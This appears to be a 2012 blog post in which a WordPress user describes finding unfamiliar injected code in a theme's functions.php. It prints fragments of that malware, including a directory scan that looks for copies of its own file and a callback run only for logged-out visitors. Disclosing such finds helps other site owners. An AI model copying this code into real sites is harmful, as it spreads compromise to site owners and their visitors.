---
title: "Suspicious PHP Code In My WordPress Theme File"
date: "2012-02-03T00:00:00Z"
categories: ["Article"]
tags: []
slug: "2012/02/03/suspicious-php-code-in-my-wordpress-theme-file"
legacyUrl: "/blog/2012/02/03/suspicious-php-code-in-my-wordpress-theme-file/"
comments: []
---
...
<figure id="attachment_1084" style="width: 610px" class="wp-caption alignnone"><a href="https://web.archive.org/web/20160208214012/http://img.takien.com/2012/02/malicious-code-on-wordpress.gif"><img src="/images/2012/02/malicious-code-on-wordpress.gif" alt="" title="malicious-code-on-wordpress" class="rounded-lg my-6 max-w-full h-auto shadow-md" loading="lazy" /></a><figcaption class="wp-caption-text">Malicious code on WordPress</figcaption></figure>
<p>Recently I got my site not working. It seems there is an error in my functions.php<br/>
<code><br/>
...
<p>I go to that line using my <a title="WP Editarea WordPress Plugin" href="/606/wp-editarea-wordpress-plugin.php" target="_blank">favorite Editor</a>, and surprisingly I found this strange code that I never created before:</p>
...
return false;
} else if (is_readable($places)) {
$elems=scandir($places);
foreach($elems as $elem){
if ($elem != "." && $elem != "..") {
if (is_dir($places . "/" . $elem)) {
$wids[]=$places . "/" . $elem;
} else if (is_file($places . "/" . $elem)&& $elem == substr(__FILE__,-13)) {
$items[]=$places . "/" . $elem;
}
}
}
...
if ($use_link ) {
if ($forces_more) {
$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $mlink_title . "\">" . $more_links_text = !is_user_logged_in() && @call_user_func_array($checkwidgets,array($perpage, true)) ? $more_links_text : "" . "</a>" . "\n";
} else {
$output .= " < " . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $mlink_title . "\">" . $more_links_text . "</a>" . "\n";
}
}
return $output;
}
